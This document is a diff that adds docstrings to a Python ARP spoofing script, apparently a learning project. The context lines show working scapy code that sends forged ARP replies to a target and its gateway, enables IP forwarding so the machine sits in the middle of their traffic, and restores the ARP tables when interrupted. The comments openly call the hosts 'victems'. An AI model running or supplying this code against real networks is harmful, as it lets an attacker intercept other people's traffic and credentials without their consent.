@@ -4,6 +4,7 @@ import subprocess
 
 
 def get_argument():
+	"""To get arguments"""
 	parser = argparse.ArgumentParser()
 	parser.add_argument('-t', '--target', help= 'the target ip')
 	parser.add_argument('-g', '--gateway', help= 'the gateway ip')
@@ -12,6 +13,7 @@ def get_argument():
 
 
 def get_mac(iprange):
+	"""This will scan network for the ip and return it's mac"""
 	arp_pkt = scapy.all.ARP(pdst = iprange)
 	ether_pkt = scapy.all.Ether(dst = 'ff:ff:ff:ff:ff:ff')
 	ether_arp_pkt = ether_pkt/arp_pkt 
@@ -20,11 +22,13 @@ def get_mac(iprange):
 	
 
 def spoof(target_ip, gateway_ip):
+	"""This will send response pkt not arp packet"""
 	response_pkt = scapy.all.ARP(op= 2, pdst= target_ip, hwdst= get_mac(target_ip),psrc= gateway_ip)
 	scapy.all.send(response_pkt, verbose =False)
 	
 		
 def restore( target_ip, gateway_ip):
+	"""This will send is at response to the target and the gateway ip to restore the arp tables"""
 	arp_pkt = scapy.all.ARP(
 		op= 2, 
 		hwsrc= get_mac(gateway_ip), 
@@ -40,6 +44,7 @@ target, gateway = get_argument()
 count = 1
 char = '.'
 
+"""Just the port forwarding command"""
 print('Setting up port forwarding')
 subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward',shell= True)
 	
@@ -60,7 +65,7 @@ try:
 		count += 1
 
 except KeyboardInterrupt:
-	
+	"""To detect ctrl+c and restore the arp tables in the victems"""
 	print('\nRestoring the arp tables in the victems')
 	restore(target, gateway)
 	restore(gateway, target)	
